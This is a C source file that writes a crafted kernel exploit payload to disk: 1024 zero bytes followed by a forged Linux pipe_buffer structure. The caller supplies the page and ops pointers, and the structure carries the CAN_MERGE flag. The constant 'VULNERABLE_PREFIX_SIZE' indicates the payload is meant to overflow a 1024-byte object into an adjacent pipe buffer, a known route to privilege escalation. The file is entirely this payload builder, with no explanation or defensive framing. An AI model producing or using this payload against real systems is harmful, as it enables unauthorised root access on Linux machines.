// SPDX-License-Identifier: GPL-2.0
#include <ctype.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define PAYLOAD_SIZE 2048
#define VULNERABLE_PREFIX_SIZE 1024
#define PIPE_BUFFER_SIZE 40
#define PIPE_BUFFER_PAGE 0
#define PIPE_BUFFER_OFFSET 8
#define PIPE_BUFFER_LEN 12
#define PIPE_BUFFER_OPS 16
#define PIPE_BUFFER_FLAGS 24
#define PIPE_BUFFER_PRIVATE 32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

static unsigned long long parse_u64(const char *text, const char *name)
{
	char *end;
	unsigned long long value;

	errno = 0;
	value = strtoull(text, &end, 0);
	if (errno || isspace((unsigned char)text[0]) || text[0] == '-' || !*text ||
	    *end) {
		fprintf(stderr, "invalid %s: %s\n", name, text);
		exit(EXIT_FAILURE);
	}
	return value;
}

static void put_u32(uint8_t *at, uint32_t value)
{
	value = htole32(value);
	memcpy(at, &value, sizeof(value));
}

static void put_u64(uint8_t *at, uint64_t value)
{
	value = htole64(value);
	memcpy(at, &value, sizeof(value));
}

static uint32_t get_u32(const uint8_t *at)
{
	uint32_t value;

	memcpy(&value, at, sizeof(value));
	return le32toh(value);
}

static uint64_t get_u64(const uint8_t *at)
{
	uint64_t value;

	memcpy(&value, at, sizeof(value));
	return le64toh(value);
}

static int check_payload(const uint8_t *payload, uint64_t page, uint64_t ops,
			 uint32_t offset)
{
	const uint8_t *entry = payload + VULNERABLE_PREFIX_SIZE;
	size_t index;

	for (index = 0; index < VULNERABLE_PREFIX_SIZE; index++)
		if (payload[index])
			return 0;
	if (get_u64(entry + PIPE_BUFFER_PAGE) != page ||
	    get_u32(entry + PIPE_BUFFER_OFFSET) != offset ||
	    get_u32(entry + PIPE_BUFFER_LEN) != 1 ||
	    get_u64(entry + PIPE_BUFFER_OPS) != ops ||
	    get_u32(entry + PIPE_BUFFER_FLAGS) != PIPE_BUF_FLAG_CAN_MERGE ||
	    get_u64(entry + PIPE_BUFFER_PRIVATE) != 0)
		return 0;
	for (index = VULNERABLE_PREFIX_SIZE + PIPE_BUFFER_SIZE;
	     index < PAYLOAD_SIZE; index++)
		if (payload[index])
			return 0;
	return 1;
}

static int write_payload(int fd, const uint8_t *payload)
{
	size_t remaining = PAYLOAD_SIZE;

	while (remaining) {
		ssize_t written = write(fd, payload + PAYLOAD_SIZE - remaining,
					remaining);

		if (written < 0) {
			if (errno == EINTR)
				continue;
			perror("write payload");
			return 0;
		}
		if (!written) {
			fprintf(stderr, "write payload: short write\n");
			return 0;
		}
		remaining -= written;
	}
	return 1;
}

int main(int argc, char **argv)
{
	uint8_t payload[PAYLOAD_SIZE] = { 0 };
	uint8_t *entry = payload + VULNERABLE_PREFIX_SIZE;
	uint64_t page, ops;
	uint32_t offset;
	unsigned long long parsed_offset;
	int fd;

	if (argc != 5) {
		fprintf(stderr, "usage: %s <output> <page> <ops> <offset>\n", argv[0]);
		return EXIT_FAILURE;
	}
	page = parse_u64(argv[2], "page");
	ops = parse_u64(argv[3], "ops");
	parsed_offset = parse_u64(argv[4], "offset");
	if (!page || !ops || parsed_offset > 4094) {
		fprintf(stderr, "page and ops must be nonzero; offset must be 0..4094\n");
		return EXIT_FAILURE;
	}
	offset = parsed_offset;
	put_u64(entry + PIPE_BUFFER_PAGE, page);
	put_u32(entry + PIPE_BUFFER_OFFSET, offset);
	put_u32(entry + PIPE_BUFFER_LEN, 1);
	put_u64(entry + PIPE_BUFFER_OPS, ops);
	put_u32(entry + PIPE_BUFFER_FLAGS, PIPE_BUF_FLAG_CAN_MERGE);
	put_u64(entry + PIPE_BUFFER_PRIVATE, 0);
	if (!check_payload(payload, page, ops, offset)) {
		fprintf(stderr, "payload self-check failed\n");
		return EXIT_FAILURE;
	}
	fd = open(argv[1], O_WRONLY | O_CREAT | O_EXCL, 0600);
	if (fd < 0) {
		perror(argv[1]);
		return EXIT_FAILURE;
	}
	if (!write_payload(fd, payload)) {
		close(fd);
		unlink(argv[1]);
		return EXIT_FAILURE;
	}
	if (close(fd)) {
		perror("close payload");
		unlink(argv[1]);
		return EXIT_FAILURE;
	}
	return EXIT_SUCCESS;
}
